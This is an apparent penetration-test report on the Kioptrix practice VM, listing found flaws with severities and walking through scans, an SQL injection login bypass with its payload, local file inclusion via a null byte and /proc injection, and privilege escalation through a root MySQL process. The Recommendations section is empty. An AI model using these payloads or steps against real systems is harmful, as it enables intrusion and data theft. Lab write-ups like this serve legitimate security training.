# Application Penetration Testing Report Kioptrix-v1.3


## Intoduction and Objectives

The application penetration testing report contains efforts that were conducted in order to find vulnerabilities, which a threat actor can use to gain control over the web application. For the scope of this penetration test, the web application was deployed in the Virualized Enviorement with no additional information about the system.

IP address: **192.168.23.131**

The assumption with severity calculation was made that the system is intended to go public soon.

## Summary


### High-Level Summary

This chapter presents the high overview of the results found during the application penetration test.
The chart and table below presents the findings with the coresponding severity.

![VULN_SEV_KIOPTRIX](../master/static/barchart_kioptrix.png)

Vulnerabilities with critical severity allow the attacker to remotely execute code on the system or to leak  data with extremly high likehood to exploit e.g. Internet facing application without authentication. Vulnerabilities with severity high allow the attacker to take over the account, leak data with relativly high likelihood to exploit. Vulnerabilities with severity medium can lead to eavasdropping of the communication between client and application, secret leakage and denial of service. Vulnerabilities with severity low can assist in exploitation of higher severity vulnerabilities.
For further reading there were CWE-ID provided.


|No.|Vulnerability									|Severity		|CWE-ID		|
|---|-------------									|--------		|------		|
|1	|SQL Injection									|**Critical**	|CWE-89		|
|2	|Local File Inclusion							|**High** 		|CWE-98		|
|3	|Weak Passwords									|Medium			|CWE-521	|
|4	|Cleartext Storage of Passwords					|Medium			|CWE-312	|
|5	|Unecnrypted communication						|Medium			|CWE-319	|
|6	|HTTP TRACE Enabled								|Low			|CWE-749	|
|7	|Anti-Clickjacking not presents					|Low			|CWE-1021	|
|8	|Cookie without httponly flag					|Low			|CWE-1004	|
|9	|Information exposure through directory path	|Low			|CWE-200	|

For the detailed description of each vulnerability, please refer to CWE-ID.


### Detailed Summary

This chapter presents the detailed summary of vulnerable endpoints. The chapter is more dedicated to technical people who are interested in remediation process. Table below presents the vulnerable HTTP endpoints with the HTTP method, parameters and Body.


|No.|Vulnerable Endpoint	|HTTP METHOD|Params			|Body										  	 |
|---|-------------------	|-----------|------			|----											 |
|1	|/checklogin.php		|POST		|-   			|myusername=test&mypassword=**test**&Submit=Login|
|2	|/member.php			|GET		|**username**	|-												 |

For remaining vulnerabilities, there are no vulnerable parameters or body but weakness lays in webserver configuration, HTTP header or general policy.

**Numbers 3 and 4** - refers to weak password policy

**Number 5** - Unecrypted communication refers to sending sensitive data (username and password) over unencrypted channel. When implementing the encryption in transit, appropiate HTTP headers should be set up to ensure the strong configuration of Http over tls. The details can be found in Recommendation chapter.

**Number 6** - HTTP Trace Enabled refers to HTTP method (Trace) that refelects the input send by the user. The vulnerability allows the attacker to bypass native browser cookie protection (if in place e.g. httponly), to leak the senstive cookie by Cross-site scripting attack.

**Number 7** - vulnerability allows the attacker to render content of the website in the context of other domain owned by attacker. Unless intended as functionallity, appropiate HTTP Header has to be set up to limit the rendering of the website in different browser context.

**Number 8** - the cookie missing httponly flag which in case of Cross-site scripting attack allow the attacker to easly hijack the cookie and take over user session.

**Number 9** - the information is exposed through the directory names in the web application.

## Methodology

The testing methodology used was based on OWASP Applcation Security Verification Standard 4.0


### Information Gathering & Service Enumeration

To idetify the open ports and running services the nmap scan was run with NSE scripts.

```
root@kali:~# nmap -sS -sV -T4 -A 192.168.23.131
Starting Nmap 7.80 ( https://nmap.org ) at 2019-08-22 10:38 CEST
Nmap scan report for 192.168.23.131
Host is up (0.00062s latency).
Not shown: 566 closed ports, 430 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:DA:92:E7 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 2h49m42s, median: 1h59m59s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2019-08-22T06:38:46-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.62 ms 192.168.23.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.55 seconds
```

There are 4 tcp ports open on the machine. On port 22 tcp there is ssh service running. Port 80 tcp, exposed and outdated apache server running. On ports 139 and 445 tcp, there is Samba SMB service running. Also, nmap has identified the operating system version as Linux kernel 2.6. The next target would be the http service on port 80 tcp.


```
root@kali:~# nikto -host http://192.168.23.131
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.23.131
+ Target Hostname:    192.168.23.131
+ Target Port:        80
+ Start Time:         2019-08-22 10:10:36 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 98933, size: 5108, mtime: Tue Aug 28 12:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ Cookie PHPSESSID created without the httponly flag
+ 8724 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2019-08-22 10:11:09 (GMT2) (33 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

At this moment the nikto scan has idetify the following vulnerabilities: communication is not encrypted (number 5), HTTP Trace method is active (number 6), Anti-clickjacking header is not present (number 7), Cookie PHPSESSID created without the httponly flag (number 8).

Also please note that nikto discover **outdated** version of PHP and Apache.

To enumerate directories/files in the web application dirb will be used.
```
root@kali:~# dirb http://192.168.23.131
-----------------
DIRB v2.22   
By The Dark Raver
-----------------
START_TIME: Thu Aug 22 11:11:15 2019
URL_BASE: http://192.168.23.131/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612                                                         
---- Scanning URL: http://192.168.23.131/ ----
+ http://192.168.23.131/cgi-bin/ (CODE:403|SIZE:329)                          
==> DIRECTORY: http://192.168.23.131/images/                                  
+ http://192.168.23.131/index (CODE:200|SIZE:1255)                            
+ http://192.168.23.131/index.php (CODE:200|SIZE:1255)                        
==> DIRECTORY: http://192.168.23.131/john/                                    
+ http://192.168.23.131/logout (CODE:302|SIZE:0)                              
+ http://192.168.23.131/member (CODE:302|SIZE:220)                            
+ http://192.168.23.131/server-status (CODE:403|SIZE:334)                     

---- Entering directory: http://192.168.23.131/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                       
    (Use mode '-w' if you want to scan it anyway)
 
---- Entering directory: http://192.168.23.131/john/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                       
    (Use mode '-w' if you want to scan it anyway)
-----------------
END_TIME: Thu Aug 22 11:11:19 2019
DOWNLOADED: 4612 - FOUND: 61
```

The valueable information from the dirb scan is that potentially there is a user **john** register in the web application which corresponds to **number 9** vulnerability.

### Testing and Exploitation

Further testing will be handled on the http website running on port 80 tcp. Then the communication was intercepted with the usage of local web proxy Burp Suite. This is how main page looks like.

![MAIN](../master/static/kioptrix_main.jpg)

Since we have identified that the user john is valid, we may try to login to the application by sending the following POST request.

```
POST /checklogin.php HTTP/1.1
Host: 192.168.23.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.23.131/
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Cookie: PHPSESSID=46338c8d8f8b18d8ece9ae9088156bc6
Connection: close
Upgrade-Insecure-Requests: 1
 
myusername=john&mypassword=test&Submit=Login


```

The authentication failed. At this point the attacker will try to bypass authentication to continue the testing. The following payload was sent to the webserver to check for SQL injection vulnerability.

```
POST /checklogin.php HTTP/1.1
Host: 192.168.23.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.23.131/
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Cookie: PHPSESSID=46338c8d8f8b18d8ece9ae9088156bc6
Connection: close
Upgrade-Insecure-Requests: 1
 
myusername=john&mypassword=%27+OR+%27%27%3D%27&Submit=Login


```

The payload resulted in successful login and redirection to the user page.

![USER](../master/static/kioptrix_userpage.jpg)

Since, the SQL injection vulnerability was idetified the attacker would try to extract as much information as possible from the web application. For database dumping, there maybe be automated tool used called sqlmap. The sqlmap will used timebased queries to dump all the neccassary data from the database. During the penetration testing there was the **members** table dumped.

![MEMBERS](../master/static/kioptrix_members.jpg)

At this point we can have discovered the vulnerabilities **number 3 and 4**, the passwords were stored in the plaintext and also the password policy was not enforced, the password of user john is rather weak and can be ealy bruteforced.

The discovered credentials has been checked for authentication through ssh service running on port 22 tcp. As presented below, the credentials have given access to the restricted shell which was easly escaped to full bash shell.

![SSH_ROBERT](../master/static/kioptrix_ssh_robert.jpg)

At this point the severity of SQL Injection vulnerability can be state as **critical**, since it allows for remote code execution, without previous authentication/authorization.

Then, the testing has continue to discover new vulnerabilities remaining in web application.

![MEMBERS](../master/static/kioptrix_members.jpg)

One can see that there is a parameter username=john supplied in HTTP GET request. From the previous **dirb** scan the attacker knows that there is john.php and from the nikto scan we know that \*.php extenstions are mapped to no extenstions. At this point we can assumme that the application takes the input from the user and injects the template to the execute php code. The best way to check if vulnerability exists is to check if it is possible to read some files from the disk e.g. /etc/passwd.

![ETC](../master/static/kioptrix_etc.jpg)

It seems that the application cuts off the /etc, the attacker might try to duplicate /etc.


![ETC2](../master/static/kioptrix_etc2.jpg)

Now, it seems that the application appends .php at the end of the filepath. To end the string before .php is appended, one must submit the NULL byte indicating that the string has ended.

![ETC3](../master/static/kioptrix_etc3.jpg)

At this point the attacker is able to read any file from the disk with the privialges of web application. The attacker might also look for the ways to leverage the vulnerability to achive the remote code execution. With the possibility to read any files from the disk, in order to execute php code one need to upload the code anywhere in the disk.

Luckly in Linux, we have got the concept that everything is a file. Saying there are pseudofiles on the disk that are mapped to certain spaces in the memory, we can find those files in /proc directory. Additional the pseudofolder self is the pointer to the memory of current process.


![PROC](../master/static/kioptrix_proc.jpg)

At this point the attacker will try to bruteforce the appropiate PID. One may use the Intruder feature to achive that.

![INTRUDER](../master/static/kioptrix_proc2.jpg)

one may say that PID 9 has significatly lower length than other PIDs.Here is how the content looks like.

![PROC](../master/static/kioptrix_proc3.jpg)

So the data from previous request in the same session has been saved to the pseudofile on the disk. This is the input fully control by the attacker. To prove the exploitation, the following php code will be executed.

```
<?php phpinfo(); ?>
```

The payload has been URL encoded to ensure proper delivery and interpretation by webserver.

![PHPINFO](../master/static/kioptrix_phpinfo.jpg)

The vulnerability was assigned with severity **high**, since it requires previous authentication.


### Appendix - Privilage Escalation

After achiveing low privilaged user shell in the OS. The attacker will look for privilage escalation. From the discovery phase we know that it is possible to run the kernel expoit, however it is recommened to look for wrongly configured services, cronjobs, processes with wrongly set permissions, setuid files since the kernel expoits might affect the avaiability of services.

The attacker found out that there is a mysqld process runinng as with root permission.

![Mysql1](../master/static/kioptrix_mysql1.jpg)

Also in the web application configuration files the attacker found the login to mysql root account.

![Mysql2](../master/static/kioptrix_mysql2.jpg)

With that knowledge, the attacker might easly login to mysql running on localhost with mysql user root credentials and use builtin mysql function to execute system commands with the privilages of current running process. The attacker can change the permissions of currently login user by adding it to admin group or create new user in a system with admin privilages.

![Mysql3](../master/static/kioptrix_mysql3.jpg)

The attacker can login as root.

![Root](../master/static/kioptrix_root.jpg)


## Recommendations







